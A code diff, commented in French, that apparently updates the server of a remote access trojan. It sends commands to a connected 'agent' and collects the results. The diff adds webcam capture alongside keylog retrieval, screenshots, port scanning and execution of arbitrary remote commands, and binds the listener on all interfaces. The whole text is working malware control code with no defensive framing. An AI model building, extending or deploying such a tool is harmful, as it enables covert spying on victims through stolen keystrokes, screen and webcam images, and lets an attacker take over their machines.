@@ -48,18 +48,24 @@ def handle_connection(connection, address):
     afficher_ascii_art("dracaufeu.txt")
     print(f"Connexion établie avec {address}")
 
-    help_text = """
-        Commandes disponibles:
-        - exit : Ferme la connexion avec le client.
-        - keylog : Affiche les frappes enregistrées par le keylogger.
-        - screenshot : Prend une capture d'écran du client et l'enregistre sous le nom 'screen.png'.
-        - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
-        - help : Affiche cette aide.
-        """
+    help_text = (
+        "\033[1;34m"
+        "┌───────────────────────────────────────────────────────────┐\n"
+        "│                    Commandes disponibles                  │\n"
+        "├───────────────────────────────────────────────────────────┤\033[0m\n"
+        "│ \033[1;32mexit\033[0m          : Ferme la connexion avec le client.          │\033[0m\n"
+        "│ \033[1;32mkeylog\033[0m        : Affiche les frappes enregistrées par le keylogger. │\033[0m\n"
+        "│ \033[1;32mscreenshot\033[0m    : Prend une capture d'écran de l'agent et l'enregistre sur le serveur.   │\033[0m\n"
+        "│ \033[1;32mwebcam\033[0m        : Prend une photo avec la webcam de l'agent et l'enregistre sur le serveur..              │\033[0m\n"
+        "│ \033[1;32mscan <start> <end>\033[0m : Scanne les ports dans une plage donnée. │\033[0m\n"
+        "│ \033[1;32mhelp\033[0m          : Affiche cette aide.                          │\033[0m\n"
+        "\033[1;34m"
+        "└───────────────────────────────────────────────────────────┘\033[0m"
+    )
 
     while True:
         try:
-            command = input("Entrer 'help' pour afficher les commandes disponibles ou 'exit' pour quitter : ")
+            command = input("Entrer une commande à exécuter ('exit' ou 'help' pour commencer) : ")
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
@@ -76,10 +82,12 @@ def handle_connection(connection, address):
                 except FileNotFoundError:
                     print("Aucun fichier keylog trouvé.")
 
-            elif command.lower() == 'screenshot':
+            elif command.lower() == 'screenshot' or command.lower() == 'webcam':
                 connection.send(command.encode())
+
                 img_size = int(connection.recv(1024).decode())
                 connection.send(b'OK')
+
                 img_data = b''
                 while len(img_data) < img_size:
                     packet = connection.recv(4096)
@@ -87,24 +95,36 @@ def handle_connection(connection, address):
                         break
                     img_data += packet
 
-                with open("screen.png", "wb") as f:
-                    f.write(img_data)
-                print("Capture réussie !")
-                continue
+                if command.lower() == 'screenshot':
+                    with open("screenshot.png", "wb") as f:
+                        f.write(img_data)
+                    print("\u001B[32m✅\u001B[0m Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
+                else:
+                    with open("webcam.png", "wb") as f:
+                        f.write(img_data)
+                    print("\u001B[32m✅\u001B[0m Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")
 
-            elif command.startswith("scan"):
+            elif command.startswith('scan'):
+                parts = command.split()
+                if len(parts) != 3:
+                    print("\u001B[31m❌\u001B[0m  Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>")
+                    continue
+
+                connection.send(command.encode())
                 print("Scan en cours...")
                 response = connection.recv(4096).decode()
-                print(f"Résultat du scan :\n{response}")
+                print(f"\u001B[34mℹ️\u001B[0m  Résultat du scan :\n{response}")
+                continue
+
+            elif command.lower() == 'pop_ascii':
+                afficher_ascii_art("dracaufeu.txt")
                 continue
 
             else:
                 connection.send(command.encode())
-
                 response = connection.recv(4096).decode()
                 if not response:
                     break
-
                 print(f"Output:\n{response}")
         except Exception as e:
             print(f"Error: {e}")
@@ -113,8 +133,11 @@ def handle_connection(connection, address):
     connection.close()
 
 def start_server():
+    """
+    Fonction pour établir une connexion avec l'agent.
+    """
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ss.bind((ip_address, port_number))
+    ss.bind(('0.0.0.0', 1234))
     ss.listen(5)
     print(f"Serveur en écoute sur {ip_address}:{port_number}")
 
